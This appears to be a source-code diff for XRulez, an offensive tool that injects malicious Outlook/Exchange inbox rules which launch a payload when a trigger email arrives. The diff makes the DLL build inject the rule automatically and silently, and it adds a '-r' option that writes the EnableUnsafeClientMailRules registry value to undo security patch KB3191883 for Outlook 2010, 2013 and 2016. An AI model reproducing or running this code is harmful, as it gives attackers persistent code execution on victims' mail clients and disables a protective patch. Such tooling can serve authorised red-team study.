@@ -36,26 +36,16 @@ bool XRulez::Application::Process()
 		// Validate and resolve (compilation) command-line parameters. This will be also used by XRulezBuilder.
 		if (!ProcessInputParameters())
 			return false;
-
-		// Show some text on the screen.
-		Comment(TEXT("Performing injection..."));
-
-		// Create and inject malicious rule.
-		MapiTools::CallKernelOnInboxFolder<void>(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService, !Enviro::IsDllBuild, m_ProfileName,
-			[&](MapiTools::MapiFolder const& inboxFolder) { inboxFolder.InjectXrule(m_RuleName, m_TriggerText, m_RulePayloadPath); });
-
-		// Comment and terminate.
-		Comment(TEXT("Injection successful.\n"));
 	}
 	// Let's just show XException::what() to the user.
 	catch (CppTools::XException& e)
 	{
-		CommentError(TEXT("Failed to inject rule.\n") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
+		CommentError(TEXT("Caught an unhandled exception. ") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
 	}
 	// Catch all unhandled exceptions. We need to show no symptoms of running (especially when in a DLL).
 	catch (...)
 	{
-		CommentError(TEXT("Failed to inject rule.\nCaught an unhandled exception."));
+		CommentError(TEXT("Caught an unhandled exception."));
 	}
 
 	// Return success.
@@ -70,10 +60,16 @@ bool XRulez::Application::ProcessInputParameters()
 
 	// If we're on the DLL, update values with those in string table.
 	if (Enviro::IsDllBuild)
+	{
 		DllProcessStringTableParameters();
-
-	// Then process executable's input.
-	return Enviro::IsDllBuild ? true : ExeProcessParameters();
+		PerformInjection();
+		return true;
+	}
+	else
+	{
+		// Process executable's input.
+		return ExeProcessParameters();
+	}
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -147,8 +143,11 @@ bool XRulez::Application::ExeProcessParameters()
 	case TEXT('l'):																//< Display a list of available MAPI profiles.
 		return ExeListOutlookProfiles(), false;
 
+	case TEXT('r'):																//< Disable security patch KB3191883.
+		return ExeDisableSecurityPatchKB3191883();
+
 	case TEXT('a'):																//< Process command line values, validate them and proceed to message injection.
-		return ExeProcessCommandLineValues();
+		return ExeProcessCommandLineValues() && PerformInjection();
 
 	case TEXT('d'):																//< Display parameters default (precompiled) values.
 		return ExeShowDefaultParamsValues(), false;
@@ -287,6 +286,12 @@ void XRulez::Application::ExeShowUsage(bool error)
 		TEXT("\n\nXRulez.exe -a [--profile PROFILE] [--name NAME] [--trigger TRIGGER] [--payload PAYLOAD]")
 		TEXT("\n\tCreates and adds a new Exchange rule. Default, built-in values (use -d to see them) are used for all omitted params. If profile name is blank then default Outlook profile will be used. Other params must not be blank.")
 
+		//TEXT("\n\nXRulez.exe -p")
+		//TEXT("\n\tChecks if EnableUnsafeClientMailRules security patch KB3191883 for Outlook 2013 and 2016.")
+
+		TEXT("\n\nXRulez.exe -r")
+		TEXT("\n\tDisables security patch KB3191883 (re-enables run-actions for Outlook 2010, 2013 and 2016).")
+
 		TEXT("\n\nXRulez.exe -i")
 			TEXT("\n\tPerforms an interactive configuration and proceeds to message injection.")
 
@@ -418,6 +423,56 @@ bool XRulez::Application::ExeProcessCommandLineValues()
 
 	// Return true if everything went right.
 	return true;
+}
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+bool XRulez::Application::PerformInjection()
+{
+	try
+	{
+		// Show some text on the screen.
+		Comment(TEXT("Performing injection..."));
+
+		// Create and inject malicious rule.
+		MapiTools::CallKernelOnInboxFolder<void>(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService, !Enviro::IsDllBuild, m_ProfileName,
+			[&](MapiTools::MapiFolder const& inboxFolder) { inboxFolder.InjectXrule(m_RuleName, m_TriggerText, m_RulePayloadPath); });
+
+		// Comment and terminate.
+		Comment(TEXT("Injection successful.\n"));
+		return true;
+	}
+	// Let's just show XException::what() to the user.
+	catch (CppTools::XException& e)
+	{
+		CommentError(TEXT("Failed to inject rule.\n") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
+	}
+	catch (...)
+	{
+		CommentError(TEXT("Failed to inject rule.\nCaught an unhandled exception."));
+	}
+
+	return false;
+}
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+bool XRulez::Application::ExeDisableSecurityPatchKB3191883()
+{
+	auto DisablePathForOutlookVersion = [](std::wstring const& registyKey, std::tstring const& outlookVersionName)
+	{
+		if (auto hr = WinTools::Registry::SetValue(WinTools::Registry::HKey::CurrentUser, registyKey, L"EnableUnsafeClientMailRules", 1))
+			return Enviro::tcerr << TEXT("[-] Couldn't re-enable run-actions for ") << CppTools::StringConversions::Convert<std::tstring>(outlookVersionName.c_str()) << TEXT(". ")
+				<< WinTools::ConvertHresultToMessageWithHresult(hr).c_str() << std::endl << std::endl, false;
+		
+		return true;
+	};
+
+	Comment(TEXT("Disabling security patch for Outlook 2010, 2013 and 2016..."));
+	auto success = DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\14.0\Outlook\Security)", TEXT("Outlook 2010"))
+		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\15.0\Outlook\Security)", TEXT("Outlook 2013"))
+		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\16.0\Outlook\Security)", TEXT("Outlook 2016"));
+
+	Comment(TEXT("Done.\n"));
+	return success;
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
